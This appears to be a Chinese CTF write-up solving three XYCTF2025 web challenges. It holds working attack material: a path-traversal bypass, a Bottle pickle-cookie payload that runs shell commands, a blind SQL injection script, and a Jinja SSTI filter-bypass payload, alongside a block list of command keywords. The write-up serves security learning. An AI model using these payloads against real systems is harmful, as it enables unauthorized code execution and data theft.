<h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   main.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/28 22:20:49</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag_&#123;uuid4&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, response, redirect, static_file, run, route</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../../secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    secret = f.read()<span class="comment">#Hell0_H@cker_Y0u_A3r_Sm@r7</span></span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/download&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    name = request.query.filename</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;../../&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> name.startswith(<span class="string">&#x27;/&#x27;</span>) <span class="keyword">or</span> name.startswith(<span class="string">&#x27;../&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">        response.status = <span class="number">403</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Forbidden&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret_page</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=secret)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=secret)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Forbidden!&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;The secret has been deleted!&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error!&quot;</span></span><br><span class="line">run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>喜欢bottle框架的题，因为是单文件的，看源码非常方便！！</p>
<p>这题好像是个1day？？bottle框架的pickle反序列化利用（通过cookie）</p>
<p>考察的是bottle框架的cookie加密机制。</p>
<p>至于文件读取直接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./.././../secret.txt</span><br></pre></td></tr></table></figure>

<p>即可绕过。尝试读环境变量等全部失败，且flag的名称为随机的uuid4值，读是读不了一点的，也没能发现flag的名称。</p>
<p>尝试跟进&#x2F;secret路由下get_cookie以及set_cookie的源码，发现存在pickle.loads，一眼pickle反序列化。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">self, key, default=<span class="literal">None</span>, secret=<span class="literal">None</span>, digestmod=hashlib.sha256</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Return the content of a cookie. To read a `Signed Cookie`, the</span></span><br><span class="line"><span class="string">        `secret` must match the one used to create the cookie (see</span></span><br><span class="line"><span class="string">        :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing</span></span><br><span class="line"><span class="string">        cookie or wrong signature), return a default value. &quot;&quot;&quot;</span></span><br><span class="line">    value = <span class="variable language_">self</span>.cookies.get(key)</span><br><span class="line">    <span class="keyword">if</span> secret:</span><br><span class="line">        <span class="comment"># See BaseResponse.set_cookie for details on signed cookies.</span></span><br><span class="line">        <span class="keyword">if</span> value <span class="keyword">and</span> value.startswith(<span class="string">&#x27;!&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;?&#x27;</span> <span class="keyword">in</span> value:</span><br><span class="line">            sig, msg = <span class="built_in">map</span>(tob, value[<span class="number">1</span>:].split(<span class="string">&#x27;?&#x27;</span>, <span class="number">1</span>))</span><br><span class="line">            <span class="built_in">hash</span> = hmac.new(tob(secret), msg, digestmod=digestmod).digest()</span><br><span class="line">            <span class="keyword">if</span> _lscmp(sig, base64.b64encode(<span class="built_in">hash</span>)):</span><br><span class="line">                dst = pickle.loads(base64.b64decode(msg))</span><br><span class="line">                <span class="keyword">if</span> dst <span class="keyword">and</span> dst[<span class="number">0</span>] == key:</span><br><span class="line">                    <span class="keyword">return</span> dst[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> default</span><br><span class="line">    <span class="keyword">return</span> value <span class="keyword">or</span> default</span><br></pre></td></tr></table></figure>

<p>get_cookie对应cookie的解密机制，set_cookie对应cookie的加密机制，本地搭建一个环境</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, response, redirect, static_file, run, route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line"></span><br><span class="line">secret = <span class="string">&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cmd</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;o&#x27;+&#x27;s&#x27;).system(&#x27;tac /flag* &gt;1.txt&#x27;)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret_page</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=secret)</span><br><span class="line">        <span class="built_in">print</span>(session)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=secret)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Forbidden!&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;The secret has been deleted!&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/set&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_signed_cookie</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;start&#x27;</span>)</span><br><span class="line">    session = &#123;<span class="string">&quot;name&quot;</span>: cmd()&#125;</span><br><span class="line">    <span class="comment">#session=&#123;&quot;name&quot;:&quot;admin&quot;&#125;</span></span><br><span class="line">    response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=secret)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Cookie set!&quot;</span></span><br><span class="line"></span><br><span class="line">run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8082</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>先尝试将name设置为guest以及admin的值，发现与题目的一样，那么就拿捏了。</p>
<img src="/2025/04/09/XYCTF2025-Web-wp/image-20250404171331082.png" class="" title="This is an example image">



<img src="/2025/04/09/XYCTF2025-Web-wp/image-20250404171503774.png" class="" title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;We1c0me_t0_XYCTF_2o25!The_secret_1s_L@men7XU_L0v3_u!&#125;</span><br></pre></td></tr></table></figure>





<h2 id="ezsql-手动滑稽"><a href="#ezsql-手动滑稽" class="headerlink" title="ezsql(手动滑稽)"></a>ezsql(手动滑稽)</h2><p>第一关第二关就是sql注入读到就行，第三关是无回显rce。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">target=<span class="string">&#x27;http://eci-2ze8si9wekdzhhw9ll87.cloudeci1.ichunqiu.com/login.php&#x27;</span></span><br><span class="line">sum_str=string.ascii_letters+string.digits+<span class="string">&#x27;-_&#123;&#125;,&#x27;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> sum_str:</span><br><span class="line">        <span class="comment">#payload_username=&quot;1&#x27;\tor\tsubstr(database()\tfrom\t&#123;&#125;\tfor\t1)=&#x27;&#123;&#125;&#x27;#&quot;.format(i,j)</span></span><br><span class="line">        <span class="comment">#payload_username = &quot;1&#x27;\tor\tsubstr((select\tgroup_concat(table_name)from\tinformation_schema.tables\twhere\ttable_schema=database())\tfrom\t&#123;&#125;\tfor\t1)=&#x27;&#123;&#125;&#x27;#&quot;.format(i, j)</span></span><br><span class="line">        <span class="comment">#double-check-user</span></span><br><span class="line">        <span class="comment">#payload_username = &quot;1&#x27;\tor\tsubstr((select\tgroup_concat(column_name)from\tinformation_schema.columns\twhere\ttable_name=&#x27;double_check&#x27;)\tfrom\t&#123;&#125;\tfor\t1)=&#x27;&#123;&#125;&#x27;#&quot;.format(i, j)</span></span><br><span class="line">        payload_username = <span class="string">&quot;1&#x27;\tor\tsubstr((select\tgroup_concat(secret)from\tdouble_check)\tfrom\t&#123;&#125;\tfor\t1)=&#x27;&#123;&#125;&#x27;#&quot;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">        res=requests.post(target,data=&#123;<span class="string">&quot;username&quot;</span>:payload_username,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;)</span><br><span class="line">        <span class="comment">#print(res.text)</span></span><br><span class="line">        <span class="comment">#yudeyoushang</span></span><br><span class="line">        <span class="comment">#zhonghengyisheng</span></span><br><span class="line">        <span class="comment">#dtfrtkcc0czkoua9s</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;帐号&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;nothing&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">账号        #yudeyoushang</span><br><span class="line">密码        #zhonghengyisheng</span><br><span class="line">管理员密钥        #dtfrtkcc0czkoua9s</span><br></pre></td></tr></table></figure>

<p>读到就行。然后是无回显rce。</p>
<img src="/2025/04/09/XYCTF2025-Web-wp/image-20250404184315979.png" class="" title="This is an example image">



<img src="/2025/04/09/XYCTF2025-Web-wp/image-20250404184328397.png" class="" title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XYCTF&#123;0828cfea-0555-4874-a17d-d962d9acc0b3&#125;</span><br></pre></td></tr></table></figure>





<h2 id="Now-you-see-me-1"><a href="#Now-you-see-me-1" class="headerlink" title="Now you see me 1"></a>Now you see me 1</h2><p>想了挺久的，刚开始一直在找官方文档，看哪里能构造字符集，突然发现config没有过滤，那么就可以用config来构造字符集，用<code>~</code>和<code>.</code>来进行切分和拼接。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># YOU FOUND ME ;)</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   src.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 01:10:37</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">enable_hook =  <span class="literal">False</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">audit_checker</span>(<span class="params">event,args</span>):</span><br><span class="line">    <span class="keyword">global</span> counter</span><br><span class="line">    <span class="keyword">if</span> enable_hook:</span><br><span class="line">        <span class="keyword">if</span> event <span class="keyword">in</span> [<span class="string">&quot;exec&quot;</span>, <span class="string">&quot;compile&quot;</span>]:</span><br><span class="line">            counter += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> counter &gt; <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(event)</span><br><span class="line"></span><br><span class="line">lock_within = [</span><br><span class="line">    <span class="string">&quot;debug&quot;</span>, <span class="string">&quot;form&quot;</span>, <span class="string">&quot;args&quot;</span>, <span class="string">&quot;values&quot;</span>, </span><br><span class="line">    <span class="string">&quot;headers&quot;</span>, <span class="string">&quot;json&quot;</span>, <span class="string">&quot;stream&quot;</span>, <span class="string">&quot;environ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;files&quot;</span>, <span class="string">&quot;method&quot;</span>, <span class="string">&quot;cookies&quot;</span>, <span class="string">&quot;application&quot;</span>, </span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;url&#x27;</span> ,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, </span><br><span class="line">    <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>, </span><br><span class="line">    <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>,<span class="string">&quot;self&quot;</span>, </span><br><span class="line">    <span class="string">&quot;lipsum&quot;</span>, <span class="string">&quot;cycler&quot;</span>, <span class="string">&quot;joiner&quot;</span>, <span class="string">&quot;namespace&quot;</span>, </span><br><span class="line">    <span class="string">&quot;init&quot;</span>, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;decode&quot;</span>, </span><br><span class="line">    <span class="string">&quot;batch&quot;</span>, <span class="string">&quot;first&quot;</span>, <span class="string">&quot;last&quot;</span> , </span><br><span class="line">    <span class="string">&quot; &quot;</span>,<span class="string">&quot;dict&quot;</span>,<span class="string">&quot;list&quot;</span>,<span class="string">&quot;g.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">    <span class="string">&quot;g|a&quot;</span>, <span class="string">&quot;GLOBALS&quot;</span>, <span class="string">&quot;lower&quot;</span>, <span class="string">&quot;upper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;BUILTINS&quot;</span>, <span class="string">&quot;select&quot;</span>, <span class="string">&quot;WHOAMI&quot;</span>, <span class="string">&quot;path&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;app&quot;</span>, <span class="string">&quot;setattr&quot;</span>, <span class="string">&quot;translate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sort&quot;</span>, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;encode&quot;</span>, <span class="string">&quot;\\u&quot;</span>, <span class="string">&quot;pop&quot;</span>, <span class="string">&quot;referer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;The closer you see, the lesser you find.&quot;</span>] </span><br><span class="line">        <span class="comment"># I hate all these.</span></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;try /H3dden_route&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/H3dden_route&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r3al_ins1de_th0ught</span>():</span><br><span class="line">    <span class="keyword">global</span> enable_hook, counter</span><br><span class="line">    name = flask.request.args.get(<span class="string">&#x27;My_ins1de_w0r1d&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> name.startswith(<span class="string">&quot;Follow-your-heart-&quot;</span>):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> lock_within:</span><br><span class="line">                    <span class="keyword">if</span> i <span class="keyword">in</span> name:</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&#x27;NOPE.&#x27;</span></span><br><span class="line">                enable_hook = <span class="literal">True</span></span><br><span class="line">                a = flask.render_template_string(<span class="string">&#x27;&#123;#&#x27;</span>+<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>+<span class="string">&#x27;#&#125;&#x27;</span>)</span><br><span class="line">                enable_hook = <span class="literal">False</span></span><br><span class="line">                counter = <span class="number">0</span></span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;My inside world is always hidden.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">            counter = <span class="number">0</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;NO.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to Hidden_route!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> _posixsubprocess</span><br><span class="line">        <span class="keyword">del</span> _posixsubprocess.fork_exec</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">import</span> subprocess</span><br><span class="line">    <span class="keyword">del</span> os.popen</span><br><span class="line">    <span class="keyword">del</span> os.system</span><br><span class="line">    <span class="keyword">del</span> subprocess.Popen</span><br><span class="line">    <span class="keyword">del</span> subprocess.call</span><br><span class="line">    <span class="keyword">del</span> subprocess.run</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_output</span><br><span class="line">    <span class="keyword">del</span> subprocess.getoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_call</span><br><span class="line">    <span class="keyword">del</span> subprocess.getstatusoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.PIPE</span><br><span class="line">    <span class="keyword">del</span> subprocess.STDOUT</span><br><span class="line">    <span class="keyword">del</span> subprocess.CalledProcessError</span><br><span class="line">    <span class="keyword">del</span> subprocess.TimeoutExpired</span><br><span class="line">    <span class="keyword">del</span> subprocess.SubprocessError</span><br><span class="line">    sys.addaudithook(audit_checker)</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其实就是将config渲染出来的内容作为原始字符集，逐步构造被过滤掉的字符，如果字符集中不存在某个字符，可以通过<code>request.url</code>等方式来拓展字符集，然后通过<code>~</code>来进行拼接。</p>
<img src="/2025/04/09/XYCTF2025-Web-wp/image-20250405194643424.png" class="" title="This is an example image">

<p>逐步获取一下！此处不同的人payload不同，因为url不同。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23%7d&#123;%for%0ai%0ain%0aconfig|string|slice(1)%&#125;&#123;%set%0auri%0a=%0ai.399~i.398~i.20%&#125;&#123;%print(request|attr(uri))%&#125;&#123;%for%0aj%0ain%0arequest|attr(uri)|string|slice(1)%&#125;&#123;%set%0alip=%0ai.20~i.5~i.789~i.21~i.399~i.159%&#125;&#123;%set%0aglob=i.80~i.80~i.6~i.20~i.68~j.322~i.154~i.20~i.21~i.80~i.80%&#125;&#123;%print(lip)%&#125;&#123;%print(glob)%&#125;&#123;%set%0aap=i.154~i.789~i.789~i.20~i.5~j.8~i.154~i.155~i.5~i.68~i.226%&#125;&#123;%print(request|attr(ap)|attr(glob))%&#125;&#123;%%0aendfor%0a%&#125;&#123;%%0aendfor%0a%&#125;%7B%23</span><br></pre></td></tr></table></figure>

<p>直接<code>lip|attr(glob)</code>是不可以的，亲测，主要是因为这个<code>lip</code>是不能这样被使用的，那么就要request来开头，找官方文档，发现一个<code>application</code>可以利用！</p>
